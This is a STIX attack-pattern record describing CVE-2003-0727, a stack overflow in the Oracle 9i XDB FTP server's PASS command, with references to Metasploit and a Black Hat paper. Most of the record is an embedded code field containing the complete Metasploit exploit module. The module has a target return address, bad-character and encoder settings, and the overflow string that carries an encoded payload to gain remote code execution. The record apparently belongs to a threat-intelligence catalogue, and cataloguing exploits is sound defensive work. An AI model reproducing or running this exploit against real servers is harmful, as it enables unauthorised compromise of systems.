{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6a4a1c37-2224-4627-9d56-b1d55020024e",
    "created": "2024-08-14T16:50:58.472277Z",
    "modified": "2024-08-14T16:50:58.472281Z",
    "name": "Oracle 9i XDB FTP PASS Overflow (win32)",
    "description": " By passing an overly long string to the PASS command, a stack based buffer overflow occurs. David Litchfield, has illustrated multiple vulnerabilities in the Oracle 9i XML Database (XDB), during a seminar on \"Variations in exploit methods between Linux and Windows\" presented at the Blackhat conference. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/oracle9i_xdb_ftp_pass.rb",
            "external_id": "oracle9i_xdb_ftp_pass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0727"
        },
        {
            "source_name": "reference",
            "url": "http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle 9i XDB FTP PASS Overflow (win32)',\n      'Description'    => %q{\n          By passing an overly long string to the PASS command, a\n        stack based buffer overflow occurs. David Litchfield, has\n        illustrated multiple vulnerabilities in the Oracle 9i XML\n        Database (XDB), during a seminar on \"Variations in exploit\n        methods between Linux and Windows\" presented at the Blackhat\n        conference.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2003-0727'],\n          [ 'OSVDB', '2449'],\n          [ 'BID', '8375'],\n          [ 'URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 800,\n          'BadChars' => \"\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'Oracle 9.2.0.1 Universal',\n            {\n                  'Platform' => 'win',\n                  'Ret'      => 0x60616d46, # oraclient9.dll (pop/pop/ret)\n            },\n          ],\n        ],\n      'DisclosureDate' => '2003-08-18',\n      'DefaultTarget' => 0))\n\n    register_options([Opt::RPORT(2100),])\n    deregister_options('FTPUSER', 'FTPPASS')\n  end\n\n\n  def check\n    connect\n    disconnect\n    if (banner =~ /9\\.2\\.0\\.1\\.0/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    user   = rand_text_alpha_upper(10)\n    sploit =  rand_text_alpha_upper(442) + Rex::Arch::X86.jmp_short(6)\n    sploit << make_nops(2) + [target.ret].pack('V') + payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n\n    send_cmd( ['USER', user], true )\n    send_cmd( ['PASS', sploit], false )\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-08-18",
    "x_mitre_platforms": [
        "win'"
    ]
}